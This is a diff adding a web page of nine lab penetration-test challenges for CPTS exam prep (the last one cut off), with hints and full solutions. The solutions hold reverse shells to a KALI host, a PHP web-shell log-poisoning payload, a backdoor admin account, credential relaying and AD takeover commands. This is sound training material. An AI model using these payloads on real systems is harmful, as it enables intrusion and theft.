@@ -1,0 +1,655 @@
+<% const pageTitle = 'Boss Challenges'; %>
+<% const metaDesc = 'Test your CPTS skills with 10 boss challenge scenarios — full penetration test simulations with progressive hints and full solutions.'; %>
+<% const ogPath = '/challenges'; %>
+<%- contentFor('body') %>
+
+<style>
+.challenge-grid { display: grid; gap: 1.25rem; margin-top: 1.5rem; }
+.challenge-card { background: var(--htb-surface); border: 1px solid var(--htb-border); border-radius: 10px; overflow: hidden; }
+.challenge-header { padding: 1.25rem 1.5rem; cursor: pointer; display: flex; align-items: center; gap: 1rem; user-select: none; transition: background 0.15s; }
+.challenge-header:hover { background: rgba(127,209,100,0.04); }
+.challenge-num { font-family: var(--font-mono); font-size: 0.75rem; color: var(--htb-green); background: rgba(127,209,100,0.1); border: 1px solid rgba(127,209,100,0.3); border-radius: 4px; padding: 3px 8px; flex-shrink: 0; }
+.challenge-title { font-size: 0.95rem; font-weight: 700; color: var(--text-primary); flex: 1; }
+.challenge-badges { display: flex; gap: 0.4rem; flex-shrink: 0; }
+.badge { font-size: 0.65rem; font-family: var(--font-mono); padding: 2px 7px; border-radius: 4px; }
+.badge-diff { }
+.badge-diff.hard { background: rgba(244,63,94,0.12); color: #f43f5e; border: 1px solid rgba(244,63,94,0.3); }
+.badge-diff.medium { background: rgba(251,146,60,0.12); color: #fb923c; border: 1px solid rgba(251,146,60,0.3); }
+.badge-diff.expert { background: rgba(167,139,250,0.12); color: #a78bfa; border: 1px solid rgba(167,139,250,0.3); }
+.badge-cat { background: rgba(127,209,100,0.1); color: var(--htb-green); border: 1px solid rgba(127,209,100,0.3); }
+.challenge-chevron { color: var(--text-muted); font-size: 0.75rem; transition: transform 0.2s; flex-shrink: 0; }
+.challenge-card.open .challenge-chevron { transform: rotate(90deg); }
+.challenge-body { display: none; padding: 0 1.5rem 1.5rem; border-top: 1px solid var(--htb-border); }
+.challenge-card.open .challenge-body { display: block; }
+.scenario-box { background: var(--htb-bg); border: 1px solid var(--htb-border); border-radius: 8px; padding: 1.1rem 1.25rem; margin: 1rem 0; font-size: 0.83rem; line-height: 1.7; color: var(--text-secondary); }
+.scenario-box .label { font-family: var(--font-mono); font-size: 0.7rem; color: var(--htb-green); margin-bottom: 0.5rem; display: block; }
+.objectives { margin: 1rem 0; }
+.objectives li { font-size: 0.83rem; color: var(--text-secondary); margin-bottom: 0.35rem; padding-left: 0.25rem; }
+.objectives li::marker { color: var(--htb-green); content: "▶ "; }
+.hint-system { margin-top: 1.25rem; }
+.hint-btn { font-size: 0.78rem; font-family: var(--font-mono); padding: 6px 14px; border: 1px solid var(--htb-border); border-radius: 6px; background: transparent; color: var(--text-muted); cursor: pointer; margin-right: 0.5rem; margin-bottom: 0.5rem; transition: all 0.2s; }
+.hint-btn:hover { border-color: #fb923c; color: #fb923c; }
+.hint-content { display: none; background: rgba(251,146,60,0.06); border: 1px solid rgba(251,146,60,0.3); border-radius: 8px; padding: 0.75rem 1rem; margin-top: 0.75rem; font-size: 0.82rem; color: var(--text-secondary); }
+.hint-content.visible { display: block; }
+.solution-section { margin-top: 1.25rem; border-top: 1px solid var(--htb-border); padding-top: 1.25rem; }
+.solution-toggle { font-size: 0.78rem; font-family: var(--font-mono); padding: 6px 14px; border: 1px solid rgba(244,63,94,0.4); border-radius: 6px; background: transparent; color: #f43f5e; cursor: pointer; transition: all 0.2s; }
+.solution-toggle:hover { background: rgba(244,63,94,0.08); }
+.solution-body { display: none; margin-top: 1rem; }
+.solution-body.visible { display: block; }
+.solution-body pre { background: var(--htb-bg); border: 1px solid var(--htb-border); border-radius: 8px; padding: 1rem 1.25rem; overflow-x: auto; font-size: 0.78rem; color: var(--text-secondary); font-family: var(--font-mono); margin: 0.75rem 0; }
+.solution-body h4 { font-size: 0.82rem; font-family: var(--font-mono); color: var(--htb-green); margin: 1rem 0 0.4rem; }
+</style>
+
+<div class="page-header" style="margin-bottom:1.5rem;">
+  <h1 class="page-title"><span style="color:var(--htb-green)">></span> Boss Challenges</h1>
+  <p class="page-subtitle">10 full penetration test scenarios to validate your skills before the CPTS exam. Progressive hints available — attempt each scenario before revealing the solution.</p>
+</div>
+
+<div class="challenge-grid">
+
+  <!-- Challenge 1 -->
+  <div class="challenge-card" id="c1">
+    <div class="challenge-header" onclick="toggleChallenge('c1')">
+      <span class="challenge-num">BOSS-01</span>
+      <span class="challenge-title">The Forgotten Admin Share</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff medium">Medium</span>
+        <span class="badge badge-cat">SMB · PrivEsc</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
+        You are performing an internal pentest against a small corporate network. Your starting position: connected to the network with no credentials. Nmap reveals a Windows Server 2019 host at 10.10.10.50 with SMB (445), RDP (3389), and WinRM (5985) open. Your task: gain administrative access to this host.
+      </div>
+      <div class="objectives">
+        <span style="font-size:0.78rem; font-family:var(--font-mono); color:var(--htb-green);">// OBJECTIVES</span>
+        <ul>
+          <li>Enumerate all SMB shares (including hidden/admin shares)</li>
+          <li>Identify accessible shares and extract credentials from any configuration files</li>
+          <li>Use discovered credentials to gain initial foothold</li>
+          <li>Escalate privileges to SYSTEM</li>
+          <li>Document all findings in report format</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <span style="font-size:0.78rem; font-family:var(--font-mono); color:var(--text-muted);">// HINTS (attempt first)</span><br><br>
+        <button class="hint-btn" onclick="showHint(this, 'c1-h1')">Hint 1: Initial Enumeration</button>
+        <button class="hint-btn" onclick="showHint(this, 'c1-h2')">Hint 2: Share Access</button>
+        <button class="hint-btn" onclick="showHint(this, 'c1-h3')">Hint 3: Privilege Escalation</button>
+        <div class="hint-content" id="c1-h1">Run <code>nxc smb 10.10.10.50</code> then <code>nxc smb 10.10.10.50 -u '' -p '' --shares</code> for null session share enumeration. Check for non-standard shares.</div>
+        <div class="hint-content" id="c1-h2">If you find a readable share with config files, grep for password patterns. Try discovered credentials with <code>nxc smb 10.10.10.50 -u USER -p PASS --shares</code> to see what you can now access.</div>
+        <div class="hint-content" id="c1-h3">Check <code>whoami /priv</code> after getting a shell. SeImpersonatePrivilege? Use PrintSpoofer or GodPotato.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c1-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c1-sol">
+          <h4>Step 1: SMB Enumeration</h4>
+          <pre>nxc smb 10.10.10.50
+nxc smb 10.10.10.50 -u '' -p '' --shares
+enum4linux-ng -A 10.10.10.50</pre>
+          <h4>Step 2: Null Session Share Access</h4>
+          <pre>smbclient //10.10.10.50/IT_Config -N
+ls
+get web.config
+# web.config contains: connectionString="...password=Adm1nP@ss2024..."</pre>
+          <h4>Step 3: Credential Validation + Shell</h4>
+          <pre>nxc smb 10.10.10.50 -u svc_web -p 'Adm1nP@ss2024'
+evil-winrm -i 10.10.10.50 -u svc_web -p 'Adm1nP@ss2024'</pre>
+          <h4>Step 4: Privilege Escalation</h4>
+          <pre>whoami /priv
+# SeImpersonatePrivilege Enabled → GodPotato
+upload GodPotato-NET4.exe C:\Windows\Temp\gp.exe
+.\gp.exe -cmd "net user backdoor Pass123! /add && net localgroup administrators backdoor /add"
+# Login as backdoor via Evil-WinRM → SYSTEM-level access</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Challenge 2 -->
+  <div class="challenge-card" id="c2">
+    <div class="challenge-header" onclick="toggleChallenge('c2')">
+      <span class="challenge-num">BOSS-02</span>
+      <span class="challenge-title">Web to Shell: The Exposed API</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff medium">Medium</span>
+        <span class="badge badge-cat">Web · Command Injection</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
+        A web application runs on 10.10.10.60:80. Initial Nmap shows HTTP and SSH (22). The site is a simple inventory management tool with a search function. Your goal: achieve Remote Code Execution and gain a reverse shell.
+      </div>
+      <div class="objectives">
+        <ul>
+          <li>Fuzz the web application for hidden directories and parameters</li>
+          <li>Identify and confirm command injection vulnerability</li>
+          <li>Bypass any filters and obtain a reverse shell</li>
+          <li>Escalate to root via discovered sudo rights</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <button class="hint-btn" onclick="showHint(this, 'c2-h1')">Hint 1: Web Recon</button>
+        <button class="hint-btn" onclick="showHint(this, 'c2-h2')">Hint 2: Injection Point</button>
+        <button class="hint-btn" onclick="showHint(this, 'c2-h3')">Hint 3: Filter Bypass</button>
+        <div class="hint-content" id="c2-h1">Use <code>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.60/FUZZ</code>. Look for an API endpoint like <code>/api/v1/</code>.</div>
+        <div class="hint-content" id="c2-h2">Test the search/query parameter with <code>; id</code>, <code>| id</code>, <code>&amp;&amp; id</code>. Check response body — if command output appears, you have injection.</div>
+        <div class="hint-content" id="c2-h3">If spaces are filtered, use <code>${IFS}</code> instead. If semicolons are blocked, try <code>|</code>. URL-encode if sending via GET parameter.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c2-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c2-sol">
+          <h4>Step 1: Directory Fuzzing</h4>
+          <pre>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -u http://10.10.10.60/FUZZ -mc 200,301,302
+# Finds: /api/v1/search</pre>
+          <h4>Step 2: Confirm Command Injection</h4>
+          <pre>curl "http://10.10.10.60/api/v1/search?q=test;id"
+# Response: uid=33(www-data) gid=33(www-data)...</pre>
+          <h4>Step 3: Reverse Shell</h4>
+          <pre># Start listener: nc -lvnp 4444
+# Send shell payload (URL encoded):
+curl "http://10.10.10.60/api/v1/search?q=test;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI/4444%200>%261'"</pre>
+          <h4>Step 4: PrivEsc</h4>
+          <pre>sudo -l
+# (ALL) NOPASSWD: /usr/bin/vim
+sudo vim -c ':!/bin/bash'
+# Root shell!</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Challenge 3 -->
+  <div class="challenge-card" id="c3">
+    <div class="challenge-header" onclick="toggleChallenge('c3')">
+      <span class="challenge-num">BOSS-03</span>
+      <span class="challenge-title">Active Directory First Blood</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff hard">Hard</span>
+        <span class="badge badge-cat">AD · Kerberoasting</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
+        Internal network. You have compromised a low-privilege domain user account: <code>jdoe / Welcome1</code> on CORP.LOCAL (DC: 10.10.10.5). Your target: Domain Admin. No BloodHound data yet. Start from scratch and reach DA.
+      </div>
+      <div class="objectives">
+        <ul>
+          <li>Collect BloodHound data with the provided credentials</li>
+          <li>Identify attack paths (Kerberoasting, AS-REP Roasting, or ACL abuse)</li>
+          <li>Crack/exploit discovered hashes or paths</li>
+          <li>DCSync to obtain all domain hashes</li>
+          <li>Demonstrate DA access (list C$ on DC)</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <button class="hint-btn" onclick="showHint(this, 'c3-h1')">Hint 1: Collection</button>
+        <button class="hint-btn" onclick="showHint(this, 'c3-h2')">Hint 2: Attack Path</button>
+        <button class="hint-btn" onclick="showHint(this, 'c3-h3')">Hint 3: DA Access</button>
+        <div class="hint-content" id="c3-h1">Run <code>bloodhound-python -u jdoe -p 'Welcome1' -d corp.local -dc-ip 10.10.10.5 -c All --zip</code>. Also run <code>impacket-GetUserSPNs corp.local/jdoe:'Welcome1' -dc-ip 10.10.10.5 -request</code>.</div>
+        <div class="hint-content" id="c3-h2">In BloodHound, mark jdoe as Owned. Run "Find Shortest Paths from Owned Principals." Also check "List all Kerberoastable Accounts."</div>
+        <div class="hint-content" id="c3-h3">After cracking the SPN hash: use the service account to check BloodHound for further paths. If it has DCSync rights → <code>impacket-secretsdump</code>.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c3-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c3-sol">
+          <h4>Step 1: BloodHound Collection + Kerberoasting</h4>
+          <pre>bloodhound-python -u jdoe -p 'Welcome1' -d corp.local -dc-ip 10.10.10.5 -c All --zip
+impacket-GetUserSPNs corp.local/jdoe:'Welcome1' -dc-ip 10.10.10.5 -request -outputfile spns.txt</pre>
+          <h4>Step 2: Crack SPN Hash</h4>
+          <pre>hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
+# Cracked: svc_sql / SqlAdmin2024!</pre>
+          <h4>Step 3: BloodHound Path from svc_sql</h4>
+          <pre># BloodHound shows: svc_sql → GenericWrite → HR_MANAGERS group
+# HR_MANAGERS → WriteDACL → Domain Admins
+# Add svc_sql to HR_MANAGERS:
+net rpc group addmem "HR_MANAGERS" "svc_sql" -U corp.local/svc_sql%'SqlAdmin2024!' -S 10.10.10.5</pre>
+          <h4>Step 4: WriteDACL → DCSync → DA</h4>
+          <pre>impacket-dacledit corp.local/svc_sql:'SqlAdmin2024!' -dc-ip 10.10.10.5 \
+  -action write -rights DCSync -principal svc_sql -target-dn "DC=corp,DC=local"
+impacket-secretsdump corp.local/svc_sql:'SqlAdmin2024!'@10.10.10.5 -just-dc-ntlm
+# Got: Administrator:500:...:8f617b3daa4f19d10b...
+nxc smb 10.10.10.5 -u Administrator -H 8f617b3daa4f19d10b... --shares</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Challenge 4 -->
+  <div class="challenge-card" id="c4">
+    <div class="challenge-header" onclick="toggleChallenge('c4')">
+      <span class="challenge-num">BOSS-04</span>
+      <span class="challenge-title">The Database Pivot</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff hard">Hard</span>
+        <span class="badge badge-cat">SQLi · Pivoting</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
+        External pentest. Target: a web application at 10.10.10.70 with a login form. Behind the DMZ is an internal network 172.16.5.0/24 that is not directly reachable from your Kali. Your goal: get RCE on a host in the internal network.
+      </div>
+      <div class="objectives">
+        <ul>
+          <li>Identify and exploit SQL injection in the login form</li>
+          <li>Read files or execute OS commands via SQLi (MSSQL xp_cmdshell)</li>
+          <li>Set up a tunnel to the internal network via the compromised host</li>
+          <li>Enumerate and compromise a host in 172.16.5.0/24</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <button class="hint-btn" onclick="showHint(this, 'c4-h1')">Hint 1: SQLi Type</button>
+        <button class="hint-btn" onclick="showHint(this, 'c4-h2')">Hint 2: RCE via SQL</button>
+        <button class="hint-btn" onclick="showHint(this, 'c4-h3')">Hint 3: Pivoting</button>
+        <div class="hint-content" id="c4-h1">Test <code>' OR '1'='1</code> in login. Check if it's MSSQL with error-based: <code>' AND 1=CONVERT(int,@@version)--</code>. If MSSQL → xp_cmdshell available.</div>
+        <div class="hint-content" id="c4-h2">Enable xp_cmdshell: <code>'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--</code> then <code>'; EXEC xp_cmdshell 'whoami';--</code></div>
+        <div class="hint-content" id="c4-h3">Upload Ligolo-ng agent via xp_cmdshell + certutil. Connect it to your Kali proxy. Add route for 172.16.5.0/24. Scan from Kali directly.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c4-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c4-sol">
+          <h4>Step 1: SQLi + xp_cmdshell</h4>
+          <pre>sqlmap -u "http://10.10.10.70/login" --data "user=test&pass=test" \
+  --dbms=mssql --os-shell
+# sqlmap enables xp_cmdshell automatically, gives OS shell</pre>
+          <h4>Step 2: Upload Ligolo Agent</h4>
+          <pre># In OS shell via sqlmap:
+xp_cmdshell "certutil -urlcache -split -f http://KALI_IP/agent.exe C:\Windows\Temp\agent.exe"
+xp_cmdshell "C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert"</pre>
+          <h4>Step 3: Set Up Pivot</h4>
+          <pre># Kali proxy console:
+session   # select agent
+ifconfig  # shows 172.16.5.0/24 interface
+sudo ip route add 172.16.5.0/24 dev ligolo
+start</pre>
+          <h4>Step 4: Compromise Internal Host</h4>
+          <pre>nmap -sV 172.16.5.0/24 --open -T4
+# Finds: 172.16.5.10 with SMB open
+nxc smb 172.16.5.10 -u administrator -p 'Password123'
+# Reused creds from MSSQL sa account → admin on internal host!</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Challenge 5 -->
+  <div class="challenge-card" id="c5">
+    <div class="challenge-header" onclick="toggleChallenge('c5')">
+      <span class="challenge-num">BOSS-05</span>
+      <span class="challenge-title">Certificate Authority Takeover</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff expert">Expert</span>
+        <span class="badge badge-cat">ADCS · ESC1</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
+        Domain credentials obtained: <code>helpdesk / HelpD3sk!</code> on ENTERPRISE.LOCAL. You have no other access. AD CS is deployed. BloodHound shows no obvious paths from helpdesk to DA. Find the ADCS vulnerability and escalate to Domain Admin.
+      </div>
+      <div class="objectives">
+        <ul>
+          <li>Enumerate AD CS for vulnerable templates</li>
+          <li>Identify the ESC type and exploitation method</li>
+          <li>Request a certificate as Domain Admin</li>
+          <li>Authenticate as DA and perform DCSync</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <button class="hint-btn" onclick="showHint(this, 'c5-h1')">Hint 1: ADCS Enum</button>
+        <button class="hint-btn" onclick="showHint(this, 'c5-h2')">Hint 2: Exploitation</button>
+        <button class="hint-btn" onclick="showHint(this, 'c5-h3')">Hint 3: Auth & DCSync</button>
+        <div class="hint-content" id="c5-h1">Run <code>certipy find -u 'helpdesk@enterprise.local' -p 'HelpD3sk!' -dc-ip DC_IP -vulnerable -stdout</code>. Look for templates where "Enrollee Supplies Subject" is true.</div>
+        <div class="hint-content" id="c5-h2">ESC1: <code>certipy req -u helpdesk@enterprise.local -p 'HelpD3sk!' -ca ENTERPRISE-CA -template VulnTemplate -upn administrator@enterprise.local -dc-ip DC_IP</code></div>
+        <div class="hint-content" id="c5-h3"><code>certipy auth -pfx administrator.pfx -dc-ip DC_IP</code> gives NT hash. Use with secretsdump for full DCSync.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c5-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c5-sol">
+          <h4>Step 1: Find Vulnerable Template</h4>
+          <pre>certipy find -u 'helpdesk@enterprise.local' -p 'HelpD3sk!' \
+  -dc-ip 10.10.10.5 -vulnerable -stdout
+# Output: Template "CorpUser" — ESC1 (Enrollee Supplies Subject: True, Any domain user can enroll)</pre>
+          <h4>Step 2: Request DA Certificate</h4>
+          <pre>certipy req -u 'helpdesk@enterprise.local' -p 'HelpD3sk!' \
+  -ca 'ENTERPRISE-CA' -template 'CorpUser' \
+  -upn 'administrator@enterprise.local' -dc-ip 10.10.10.5
+# Saved: administrator.pfx</pre>
+          <h4>Step 3: Authenticate + DCSync</h4>
+          <pre>certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
+# NT Hash: 8f617b3daa4f19d1...
+impacket-secretsdump enterprise.local/administrator@10.10.10.5 -hashes :8f617b3daa4f19d1... -just-dc-ntlm</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Challenge 6 -->
+  <div class="challenge-card" id="c6">
+    <div class="challenge-header" onclick="toggleChallenge('c6')">
+      <span class="challenge-num">BOSS-06</span>
+      <span class="challenge-title">LFI to Shell to Root</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff medium">Medium</span>
+        <span class="badge badge-cat">Web · LFI · PrivEsc</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
+        PHP web application at 10.10.10.80. The site has a page parameter: <code>http://10.10.10.80/index.php?page=home</code>. Your goal: escalate from LFI to Remote Code Execution and obtain root on the Linux server.
+      </div>
+      <div class="objectives">
+        <ul>
+          <li>Confirm LFI vulnerability and read sensitive files (/etc/passwd, SSH keys)</li>
+          <li>Escalate LFI to RCE (log poisoning or PHP wrappers)</li>
+          <li>Obtain a reverse shell and escalate to root</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <button class="hint-btn" onclick="showHint(this, 'c6-h1')">Hint 1: LFI Confirm</button>
+        <button class="hint-btn" onclick="showHint(this, 'c6-h2')">Hint 2: LFI to RCE</button>
+        <button class="hint-btn" onclick="showHint(this, 'c6-h3')">Hint 3: PrivEsc</button>
+        <div class="hint-content" id="c6-h1">Try <code>?page=../../../../etc/passwd</code>. If you see /etc/passwd content, LFI is confirmed. Also try <code>?page=../../../../var/log/apache2/access.log</code>.</div>
+        <div class="hint-content" id="c6-h2">Log poisoning: <code>curl -A '&lt;?php system($_GET["cmd"]); ?&gt;' http://10.10.10.80/</code> — then <code>?page=../../../../var/log/apache2/access.log&cmd=id</code>. Or use PHP filter wrapper: <code>php://filter/convert.base64-encode/resource=index.php</code>.</div>
+        <div class="hint-content" id="c6-h3">Once you have a shell as www-data: run <code>sudo -l</code> and <code>find / -perm -4000 2>/dev/null</code>. Check for writable cron jobs.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c6-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c6-sol">
+          <h4>Step 1: Confirm LFI</h4>
+          <pre>curl "http://10.10.10.80/index.php?page=../../../../etc/passwd"
+# Shows /etc/passwd content — LFI confirmed</pre>
+          <h4>Step 2: Log Poisoning → RCE</h4>
+          <pre>curl -A '<?php system($_GET["cmd"]); ?>' http://10.10.10.80/
+curl "http://10.10.10.80/index.php?page=../../../../var/log/apache2/access.log&cmd=id"
+# uid=33(www-data) — RCE confirmed</pre>
+          <h4>Step 3: Reverse Shell</h4>
+          <pre># URL-encode the bash reverse shell payload:
+curl "http://10.10.10.80/index.php?page=../../../../var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI/4444%200>%261'"</pre>
+          <h4>Step 4: Root via SUID</h4>
+          <pre>find / -perm -4000 2>/dev/null
+# /usr/bin/python3 has SUID bit!
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+whoami  # root</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Challenge 7 -->
+  <div class="challenge-card" id="c7">
+    <div class="challenge-header" onclick="toggleChallenge('c7')">
+      <span class="challenge-num">BOSS-07</span>
+      <span class="challenge-title">Poisoned Network</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff hard">Hard</span>
+        <span class="badge badge-cat">LLMNR · Relay · AD</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
+        Newly connected to internal network segment 10.10.20.0/24. No credentials. 3 Windows hosts visible, all domain-joined to FINANCE.LOCAL. SMB signing status unknown. Your goal: capture or relay credentials to gain initial access.
+      </div>
+      <div class="objectives">
+        <ul>
+          <li>Identify hosts with SMB signing disabled (relay targets)</li>
+          <li>Set up Responder + ntlmrelayx chain</li>
+          <li>Capture or relay credentials to gain local admin</li>
+          <li>Dump SAM and identify any domain accounts</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <button class="hint-btn" onclick="showHint(this, 'c7-h1')">Hint 1: Target Discovery</button>
+        <button class="hint-btn" onclick="showHint(this, 'c7-h2')">Hint 2: Setup</button>
+        <button class="hint-btn" onclick="showHint(this, 'c7-h3')">Hint 3: Using Access</button>
+        <div class="hint-content" id="c7-h1"><code>nxc smb 10.10.20.0/24 --gen-relay-list relay-targets.txt</code> — this lists hosts without SMB signing. If all hosts have signing enabled, fall back to hash capture and cracking.</div>
+        <div class="hint-content" id="c7-h2">Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off. Then: <code>sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support</code> and <code>sudo responder -I eth0 -wfv</code></div>
+        <div class="hint-content" id="c7-h3">If relay gives SAM dump: use local admin hash for PTH across the network (<code>nxc smb 10.10.20.0/24 -u Administrator -H HASH --local-auth</code>). Look for shared local admin passwords.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c7-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c7-sol">
+          <h4>Step 1: Find Relay Targets</h4>
+          <pre>nxc smb 10.10.20.0/24 --gen-relay-list relay-targets.txt
+# relay-targets.txt: 10.10.20.30, 10.10.20.40 (signing disabled)</pre>
+          <h4>Step 2: Responder + ntlmrelayx</h4>
+          <pre># Terminal 1:
+impacket-ntlmrelayx -tf relay-targets.txt -smb2support
+# Terminal 2:
+sudo responder -I eth0 -wfv</pre>
+          <h4>Step 3: Triggered by LLMNR Broadcast</h4>
+          <pre># After waiting ~2 min, a user tries to access \\fileserver (non-existent)
+# Responder answers → ntlmrelayx relays to 10.10.20.30
+# SAM dump output:
+# Administrator:500:...:e3e3e3e3e3e3e3e3...::: (hash)</pre>
+          <h4>Step 4: Lateral Movement</h4>
+          <pre>nxc smb 10.10.20.0/24 -u Administrator -H e3e3e3e3e3e3e3e3 --local-auth
+# 10.10.20.30 [+] Admin
+# 10.10.20.40 [+] Admin  ← shared local admin password!
+impacket-secretsdump -hashes :e3e3e3e3e3e3e3e3 ./Administrator@10.10.20.40
+# Finds domain creds: FINANCE\domain_user:ComplexPass99!</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Challenge 8 -->
+  <div class="challenge-card" id="c8">
+    <div class="challenge-header" onclick="toggleChallenge('c8')">
+      <span class="challenge-num">BOSS-08</span>
+      <span class="challenge-title">The Forgotten Backup</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff medium">Medium</span>
+        <span class="badge badge-cat">Password Attacks · Linux PrivEsc</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
+        Linux server at 10.10.10.90. FTP anonymous login allowed. SSH on port 22. Web server on 8080 showing a maintenance page. Your goal: root on the Linux host using only the information available.
+      </div>
+      <div class="objectives">
+        <ul>
+          <li>Enumerate FTP and download all accessible files</li>
+          <li>Crack any discovered password hashes</li>
+          <li>Gain SSH access with recovered credentials</li>
+          <li>Find privilege escalation path to root</li>
+        </ul>
+      </div>
+      <div class="hint-system">
+        <button class="hint-btn" onclick="showHint(this, 'c8-h1')">Hint 1: FTP Enum</button>
+        <button class="hint-btn" onclick="showHint(this, 'c8-h2')">Hint 2: Credential Recovery</button>
+        <button class="hint-btn" onclick="showHint(this, 'c8-h3')">Hint 3: PrivEsc</button>
+        <div class="hint-content" id="c8-h1"><code>ftp 10.10.10.90</code> → user: anonymous, pass: (blank). <code>ls -la</code> then <code>mget *</code>. Look in subdirectories too: <code>cd backup && mget *</code></div>
+        <div class="hint-content" id="c8-h2">If you find a shadow-like file or .htpasswd: <code>hashcat -m 1800 hash.txt rockyou.txt</code> for SHA-512 hashes. <code>hashcat -m 1600</code> for MD5 Apache hashes.</div>
+        <div class="hint-content" id="c8-h3">After SSH: check <code>sudo -l</code>, <code>crontab -l</code>, <code>ls -la /etc/cron.d/</code>. If there's a writable script called by root cron, modify it for a shell.</div>
+      </div>
+      <div class="solution-section">
+        <button class="solution-toggle" onclick="toggleSolution('c8-sol')">⚠ Reveal Full Solution</button>
+        <div class="solution-body" id="c8-sol">
+          <h4>Step 1: FTP Discovery</h4>
+          <pre>ftp 10.10.10.90
+# anonymous login → found: /backup/shadow.bak
+get shadow.bak</pre>
+          <h4>Step 2: Crack Shadow Hash</h4>
+          <pre>grep 'sysadmin' shadow.bak
+# sysadmin:$6$rounds=5000$salt$hash...:
+hashcat -m 1800 shadow.bak /usr/share/wordlists/rockyou.txt
+# Cracked: sysadmin:Backup2024!</pre>
+          <h4>Step 3: SSH Login</h4>
+          <pre>ssh sysadmin@10.10.10.90</pre>
+          <h4>Step 4: Cron Job Hijack</h4>
+          <pre>cat /etc/cron.d/maintenance
+# */5 * * * * root /opt/scripts/cleanup.sh
+ls -la /opt/scripts/cleanup.sh
+# -rw-rw-r-- (world-writable!)
+echo 'bash -i >& /dev/tcp/KALI/4444 0>&1' >> /opt/scripts/cleanup.sh
+# Wait 5 min → root reverse shell</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Challenge 9 -->
+  <div class="challenge-card" id="c9">
+    <div class="challenge-header" onclick="toggleChallenge('c9')">
+      <span class="challenge-num">BOSS-09</span>
+      <span class="challenge-title">ACL Chain to Domain Admin</span>
+      <div class="challenge-badges">
+        <span class="badge badge-diff expert">Expert</span>
+        <span class="badge badge-cat">AD · ACL Abuse</span>
+      </div>
+      <span class="challenge-chevron">▶</span>
+    </div>
+    <div class="challenge-body">
+      <div class="scenario-box">
+        <span class="label">// SCENARIO</span>
